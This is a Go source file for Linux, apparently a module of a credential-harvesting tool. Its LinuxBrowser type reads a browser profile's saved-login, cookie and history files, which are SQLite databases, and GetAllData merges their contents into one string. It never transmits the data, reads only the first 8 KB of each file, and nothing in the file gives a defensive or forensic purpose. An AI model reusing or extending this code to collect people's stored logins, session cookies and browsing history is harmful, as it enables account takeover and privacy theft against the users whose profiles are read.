//go:build linux

package credential

import (
"os"
)

type LinuxBrowser struct {
Path string
}

func NewLinuxBrowser(path string) *LinuxBrowser {
return &LinuxBrowser{Path: path}
}

func (l *LinuxBrowser) ReadLoginData() (string, error) {
file, err := os.Open(l.Path + "/Login Data")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxBrowser) ReadCookies() (string, error) {
file, err := os.Open(l.Path + "/Cookies")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxBrowser) ReadHistory() (string, error) {
file, err := os.Open(l.Path + "/History")
if err != nil {
return "", err
}
defer file.Close()
buf := make([]byte, 8192)
n, err := file.Read(buf)
if err != nil {
return "", err
}
return string(buf[:n]), nil
}

func (l *LinuxBrowser) GetAllData() (string, error) {
var result string
data, err := l.ReadLoginData()
if err != nil {
return "", err
}
result += data
cookies, err := l.ReadCookies()
if err != nil {
return "", err
}
result += cookies
history, err := l.ReadHistory()
if err != nil {
return "", err
}
result += history
return result, nil
}
